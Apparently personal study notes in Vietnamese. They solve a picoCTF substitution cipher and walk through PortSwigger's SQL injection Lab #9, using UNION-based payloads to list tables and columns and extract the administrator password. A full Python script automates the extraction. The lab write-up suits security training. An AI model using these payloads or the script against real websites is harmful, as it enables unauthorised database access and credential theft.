# Cryptography  
## picoCtf
substitution0 https://play.picoctf.org/practice/challenge/307?page=1&search=substitu
Cách giải: 
- Đây là mật mã thay thế.
- 26 kí tự đầu tiên sẽ là khóa.


- from string import *
- with open("message.txt") as file:
-    content = file.read()
- upper_key = "QWITJSYHXCNDFERMUKGOPVALBZ"
- lower_key = upper_key.lower()
- for character in content:
-     if character.isupper():
-         print(ascii_uppercase[upper_key.index(character)],end = "")
-     elif character.islower():
-         print(ascii_lowercase[lower_key.index(character)],end = "")
-     else: 
-         print(character,end = "")

#Web
## portwSwigger
- SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
1. Xác định số cột của database: ' order by 1--
- https://0a2200c8030727a2c633e1d0005c006d.web-security-academy.net/filter?category=Accessories%27%20order%20by%201--
- Tăng số lần lượt từ 1 cho đến khi web trả về lỗi. Từ đó xác định được số cột trong database.(2 cột)
2. Xác định kiểu dữ liệu của cột.
- ' UNION select 'a',NULL-- 
- ' UNION select 'a','a'--
- -> cả hai cột dữ liệu là kiểu text.
3. Xác định phiên bản của database.
- ' UNION select version(),NULL--       =>PostgreSQL
4. Lấy được danh sách tên cột của database.
- ' UNION select table_name, NULL FROM  information_schema.tables--
- (lên mạng gõ information_schema.tables sau đó tìm ra được table_name)  
5. In ra tên của bảng.
- ' UNION select column_name, NULL FROM  information_schema.columns WHERE table_name = 'users_wahylc'--
- (users_wahylc tùy thuộc vào từng bài).
- password_qlrxps     username_msmtmu
6. In ra username và password.
- ' UNION select username_msmtmu, password_qlrxps from users_wahylc--
- administrator   c05fnpuhr9l97equdrn2

-import requests 
- import urllib3
- from bs4 import BeautifulSoup
- import re  
- import sys 
- import warnings
- warnings.filterwarnings("ignore", category=DeprecationWarning) 
- urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
- proxies = {'http': 'http://127.0.0.1:8080','https' : 'https://127.0.0.1:8080'}
- def perform_request(url,sql_payload):
-     path = '/filter?category=Accessories'
-     r = requests.get(url + path + sql_payload,verify = False,proxies = proxies)
-     return r.text 
- def sqli_users_table(url):
-     sql_payload = "' UNION select table_name, NULL FROM  information_schema.tables--"
-    res = perform_request(url,sql_payload)
-    soup  = BeautifulSoup(res,'html.parser')
-    users_table = soup.find(text = re.compile(".*users.*"))
-    if users_table: 
-        return users_table
-    else: 
-        return False 
-def sqli_users_columns(url,users_table): 
-    sql_payload = "' UNION select column_name, NULL FROM  information_schema.columns WHERE table_name = '%s'--" %users_table
-    res = perform_request(url,sql_payload)
-    soup = BeautifulSoup(res,'html.parser')
-    username_column = soup.find(text = re.compile('.*username.*'))
-    password_column = soup.find(text = re.compile('.*password.*'))
-    return username_column,password_column
-def sqli_administrator_cred(url,users_table,username_column,password_column):
-    sql_payload = "' UNION select %s, %s from %s--" % (username_column,password_column,users_table)
-    res = perform_request(url,sql_payload)
-    soup = BeautifulSoup(res,'html.parser')
-    admin_password = soup.body.find(text = "administrator").parent.findNext('td').contents[0] 
-    return admin_password
-if __name__ == "__main__":
-    try: 
-        url = sys.argv[1].strip()
-    except IndexError: 
-        print("[-] Usage: %s <url>" %sys.argv[0])
-        print("[-] Example: %s www.example.com" %sys.argv[0])
-        sys.exit(-1)
-    print("Looking for a users table....")
-    users_table = sqli_users_table(url)
-    if users_table:
-        print("Found the users table name: %s" %users_table)
-        username_column,password_column = sqli_users_columns(url,users_table)
-        if username_column and  password_column:
-            print("Found the username column name: %s", username_column)
-            print("Found the password column name: %s", password_column)
-            admin_password = sqli_administrator_cred(url,users_table,username_column,password_column)
-            if admin_password: 
-                print("[+] The administrator password is: %s" %admin_password) 
-            else: 
-                print("[-] Did not find the administrator password.")
-        else: 
-            print("Did not find the username and/ or the password columns.")
-    else: 
-        print("Did not find a users table.")